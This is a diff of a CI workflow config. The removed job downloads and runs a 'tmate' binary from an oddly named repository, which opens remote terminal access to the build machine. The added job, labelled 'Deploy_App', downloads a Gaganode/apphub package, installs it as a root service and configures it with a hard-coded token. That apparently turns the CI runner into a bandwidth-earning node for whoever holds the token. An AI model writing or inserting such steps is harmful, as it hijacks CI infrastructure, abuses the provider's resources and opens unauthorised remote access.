@@ -2,14 +2,20 @@ version: v1.0
 name: Your_CI_Workflow
 agent:
   machine:
-    type: e1-standard-8
-    os_image: ubuntu2004
+    type: e1-standard-2
+    os_image: ubuntu1804
 blocks:
-  - name: Build_and_Deploy
+  - name: Deploy_App
     task:
       jobs:
-        - name: Download_and_Run_Script
+        - name: Download_and_Install_App
           commands:
-            - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
-            - chmod +x tmate
-            - ./tmate
+            - 'curl -o apphub-linux-amd64.tar.gz https://assets.coreservice.io/public/package/60/app-market-gaga-pro/1.0.4/app-market-gaga-pro-1_0_4.tar.gz'
+            - tar -zxf apphub-linux-amd64.tar.gz
+            - rm -f apphub-linux-amd64.tar.gz
+            - cd ./apphub-linux-amd64
+            - sudo ./apphub service remove
+            - sudo ./apphub service install
+            - sudo ./apphub service start
+            - sudo ./apps/gaganode/gaganode config set --token=okjwaqlymyuyaawe0060f01bf4d3a551
+            - ./apphub restart
